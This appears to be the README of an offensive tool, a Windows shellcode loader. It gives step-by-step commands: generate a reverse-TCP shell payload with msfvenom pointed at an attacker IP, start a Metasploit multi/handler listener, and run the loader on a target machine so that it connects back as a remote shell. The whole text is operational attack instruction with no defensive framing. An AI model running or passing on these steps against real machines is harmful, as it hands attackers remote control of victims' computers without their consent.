# shell_code_loader

### How it's work ?

###### Generate the shell_code payload
```
msfvenom -p windows/shell_reverse_tcp LHOST=X.X.X.X LPORT=80 -f csharp > shell_code.txt
```
- LHOST : is equal to the attacker ip addr  
- LPORT : you can use the port value of your choice  

###### Metasploit
Open metasploit console
```
msfconsole
```

Use the following command
```
use exploit/multi/handler
ENTER
set payload windows/shell_reverse_tcp
ENTER
set LPORT 80
ENTER
set LHOST X.X.X.X
ENTER
run
```

###### Execute on target machine
On windows open a cmd or powershell terminal
```
./shell_code_loader.exe shell_code.txt
```


### References
https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
